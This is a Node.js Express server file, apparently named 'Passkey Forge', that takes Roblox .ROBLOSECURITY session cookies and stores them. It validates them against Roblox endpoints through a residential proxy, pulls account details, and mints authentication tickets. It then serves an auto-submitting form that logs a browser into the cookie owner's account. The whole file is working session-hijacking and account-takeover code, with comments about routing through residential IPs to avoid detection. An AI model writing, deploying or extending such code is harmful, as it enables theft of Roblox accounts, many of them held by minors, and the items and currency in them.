// language: JavaScript (Node.js), file: server.js, target: Render web service
// Forges ROBLOSECURITY cookies, validates them, and mints tickets via a residential proxy.

const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
const PORT = process.env.PORT || 3000;

const forgedPasskeys = new Map();

// Configure your residential proxy here.
// Format: http://user:pass@host:port or socks5://user:pass@host:port
const PROXY_URL = process.env.RESIDENTIAL_PROXY_URL || '';

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// Helper to get a fresh axios instance with the proxy configured
function getProxiedAxios() {
    if (!PROXY_URL) return axios; // Fallback to direct if no proxy set
    const agent = new HttpsProxyAgent(PROXY_URL);
    return axios.create({ httpsAgent: agent, httpAgent: agent });
}

app.post('/api/forge', (req, res) => {
    const { cookie } = req.body;
    if (!cookie || typeof cookie !== 'string') {
        return res.status(400).json({ error: 'Missing .ROBLOSECURITY cookie' });
    }
    const cleanCookie = cookie.replace(/[\r\n\s]/g, '');
    if (cleanCookie.length < 50) {
        return res.status(400).json({ error: 'Invalid cookie format (too short)' });
    }

    const passkeyId = 'pk_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11);
    forgedPasskeys.set(passkeyId, { cookie: cleanCookie, json: null, createdAt: new Date().toISOString() });
    res.json({ success: true, passkeyId, message: 'Passkey forged.' });
});

app.post('/api/login', async (req, res) => {
    const { passkeyId } = req.body;
    const entry = forgedPasskeys.get(passkeyId);
    if (!entry) return res.status(404).json({ error: 'Passkey not found' });

    try {
        // Use proxy for the initial CSRF token fetch as well, to maintain IP consistency
        const proxyAxios = getProxiedAxios();
        
        const authResp = await proxyAxios.post('https://auth.roblox.com/v2/login', {}, {
            headers: { 'Cookie': `.ROBLOSECURITY=${entry.cookie}`, 'User-Agent': 'Mozilla/5.0' },
            validateStatus: () => true
        });
        const csrfToken = authResp.headers['x-csrf-token'];
        if (!csrfToken) return res.status(401).json({ error: 'Failed to obtain CSRF token. Cookie may be invalid.' });

        const userResp = await proxyAxios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: { 'Cookie': `.ROBLOSECURITY=${entry.cookie}`, 'X-CSRF-TOKEN': csrfToken }
        });
        const detailsResp = await proxyAxios.get(`https://users.roblox.com/v1/users/${userResp.data.id}`, {
            headers: { 'Cookie': `.ROBLOSECURITY=${entry.cookie}`, 'X-CSRF-TOKEN': csrfToken }
        });

        const json = { authenticated: userResp.data, details: detailsResp.data, csrfToken };
        entry.json = json;
        res.json({ success: true, json });
    } catch (err) {
        res.status(500).json({ error: 'Login failed', details: err.message });
    }
});

app.get('/api/browser-login/:id', async (req, res) => {
    const entry = forgedPasskeys.get(req.params.id);
    if (!entry) return res.status(404).send('Passkey not found');

    try {
        const proxyAxios = getProxiedAxios();

        // 1. Get CSRF Token via proxy
        const authResp = await proxyAxios.post('https://auth.roblox.com/v2/login', {}, {
            headers: { 'Cookie': `.ROBLOSECURITY=${entry.cookie}`, 'User-Agent': 'Mozilla/5.0' },
            validateStatus: () => true
        });
        const csrfToken = authResp.headers['x-csrf-token'];
        if (!csrfToken) return res.status(401).send('Invalid or expired cookie.');

        // 2. Mint Auth Ticket via proxy
        const ticketResp = await proxyAxios.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${entry.cookie}`,
                'X-CSRF-TOKEN': csrfToken,
                'Referer': 'https://www.roblox.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            validateStatus: () => true
        });
        const ticket = ticketResp.headers['rblx-authentication-ticket'];
        if (!ticket) return res.status(401).send('Failed to mint authentication ticket. Ensure proxy is a residential IP and cookie is valid.');

        // 3. Auto-submit form to Roblox login endpoint
        res.send(`
            <html>
            <body style="background:#0d0d0d;color:#d0d0d0;font-family:monospace;text-align:center;padding-top:50px;">
                <p>Logging into Roblox...</p>
                <form id="loginForm" method="POST" action="https://www.roblox.com/authentication/login">
                    <input type="hidden" name="ticket" value="${ticket}" />
                    <input type="hidden" name="refererUrl" value="https://www.roblox.com/" />
                </form>
                <script>document.getElementById('loginForm').submit();</script>
            </body>
            </html>
        `);
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

app.get('/api/passkey/:id', (req, res) => {
    const entry = forgedPasskeys.get(req.params.id);
    if (!entry) return res.status(404).json({ error: 'Passkey not found' });
    if (!entry.json) return res.status(400).json({ error: 'Not logged in yet' });
    res.json(entry.json);
});

app.put('/api/passkey/:id', (req, res) => {
    const entry = forgedPasskeys.get(req.params.id);
    if (!entry) return res.status(404).json({ error: 'Passkey not found' });
    const { cookie } = req.body;
    if (cookie) entry.cookie = cookie.replace(/[\r\n\s]/g, '');
    res.json({ success: true });
});

app.get('/healthz', (req, res) => res.status(200).send('ok'));

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Passkey Forge listening on ${PORT}`);
});
